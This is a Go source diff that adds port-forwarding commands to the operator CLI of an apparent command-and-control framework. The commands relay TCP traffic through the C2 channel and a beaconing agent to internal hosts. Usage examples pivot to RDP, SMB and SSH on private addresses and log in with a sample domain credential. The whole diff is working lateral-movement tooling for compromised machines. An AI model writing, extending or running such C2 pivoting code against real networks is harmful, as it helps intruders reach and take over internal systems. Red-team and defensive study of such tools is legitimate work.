@@ -315,6 +315,119 @@ var socks5StatusCmd = &cobra.Command{
 	},
 }
 
+// ── port forwarding ───────────────────────────────────────────────────────────
+
+var portfwdCmd = &cobra.Command{
+	Use:   "portfwd",
+	Short: "Port forwarding tunnel through agent (start / list / stop)",
+}
+
+var portfwdStartCmd = &cobra.Command{
+	Use:   "start <agent-id> <target>",
+	Short: "Start a TCP tunnel: server:LOCAL_PORT → agent → TARGET",
+	Long: `Create a port-forward session. The server opens a TCP listener on LOCAL_PORT.
+When the operator connects to that port, traffic is relayed through the C2 channel
+to the agent, which dials TARGET (host:port on the internal network).
+
+Examples:
+  portfwd start 7d019eb7 192.168.1.10:3389 --local-port 33899
+  portfwd start 7d019eb7 192.168.1.50:445  --local-port 14450
+  portfwd start 7d019eb7 10.10.5.3:22      --local-port 2222
+
+After the command is queued (one beacon interval), connect to localhost:LOCAL_PORT:
+  xfreerdp /v:localhost:33899 /u:CORP\\john /p:'P@ss'
+  ssh -p 2222 admin@localhost`,
+	Args: cobra.ExactArgs(2),
+	Run: func(cmd *cobra.Command, args []string) {
+		agentID, err := resolveAgentID(args[0])
+		if err != nil {
+			printError(err.Error())
+			os.Exit(1)
+		}
+		target := args[1]
+		localPort, _ := cmd.Flags().GetInt("local-port")
+
+		raw, _ := json.Marshal(map[string]interface{}{
+			"target":     target,
+			"local_port": localPort,
+		})
+		body, err := makeAPIRequestWithMethod("POST",
+			"/api/v1/agent/"+agentID+"/portfwd",
+			bytes.NewBuffer(raw), "application/json")
+		if err != nil {
+			printError(fmt.Sprintf("portfwd start failed: %v", err))
+			os.Exit(1)
+		}
+		var resp map[string]interface{}
+		if err := json.Unmarshal(body, &resp); err != nil {
+			printError("invalid server response")
+			os.Exit(1)
+		}
+		if errMsg, ok := resp["error"].(string); ok && errMsg != "" {
+			printError("portfwd start failed: " + errMsg)
+			os.Exit(1)
+		}
+		sessID, _ := resp["session_id"].(string)
+		port, _ := resp["local_port"].(float64)
+		printSuccess(fmt.Sprintf("Port forward created:"))
+		fmt.Printf("    session   : %s\n", sessID)
+		fmt.Printf("    local     : localhost:%.0f\n", port)
+		fmt.Printf("    target    : %s\n", target)
+		fmt.Printf("    agent     : %s\n", agentID)
+		fmt.Printf("\n    [i] Wait one beacon interval then connect to localhost:%.0f\n", port)
+		fmt.Printf("        Stop with: portfwd stop %s\n\n", sessID)
+	},
+}
+
+var portfwdListCmd = &cobra.Command{
+	Use:   "list",
+	Short: "List active port-forward sessions",
+	Args:  cobra.NoArgs,
+	Run: func(cmd *cobra.Command, args []string) {
+		body, err := makeAPIRequestWithMethod("GET", "/api/v1/portfwd", nil, "")
+		if err != nil {
+			printError(fmt.Sprintf("portfwd list failed: %v", err))
+			os.Exit(1)
+		}
+		var resp map[string]interface{}
+		json.Unmarshal(body, &resp)
+		sessions, _ := resp["sessions"].([]interface{})
+		if len(sessions) == 0 {
+			printInfo("No active port-forward sessions.")
+			return
+		}
+		fmt.Printf("\n  %-10s  %-20s  %-24s  %-12s\n", "SESSION", "TARGET", "AGENT", "LOCAL PORT")
+		fmt.Println("  " + strings.Repeat("─", 72))
+		for _, s := range sessions {
+			m, _ := s.(map[string]interface{})
+			id, _ := m["id"].(string)
+			tgt, _ := m["target"].(string)
+			agent, _ := m["agent_id"].(string)
+			port, _ := m["local_port"].(float64)
+			if len(agent) > 22 {
+				agent = agent[:8]
+			}
+			fmt.Printf("  %-10s  %-20s  %-24s  %.0f\n", id, tgt, agent, port)
+		}
+		fmt.Println()
+	},
+}
+
+var portfwdStopCmd = &cobra.Command{
+	Use:   "stop <session-id>",
+	Short: "Stop and remove a port-forward session",
+	Args:  cobra.ExactArgs(1),
+	Run: func(cmd *cobra.Command, args []string) {
+		sessID := args[0]
+		_, err := makeAPIRequestWithMethod("DELETE", "/api/v1/portfwd/"+sessID, nil, "")
+		if err != nil {
+			printError(fmt.Sprintf("portfwd stop failed: %v", err))
+			os.Exit(1)
+		}
+		printSuccess(fmt.Sprintf("Session %s stopped.", sessID))
+	},
+}
+
 // ── flag registration (called from main) ─────────────────────────────────────
 
 func initPivotFlags() {
@@ -350,4 +463,7 @@ func initPivotFlags() {
 		c.Flags().Bool("wait", false, "Wait for result")
 		c.Flags().Int("timeout", 15, "Wait timeout (seconds)")
 	}
+
+	// portfwd
+	portfwdStartCmd.Flags().Int("local-port", 0, "Local port to listen on (0 = OS-assigned)")
 }
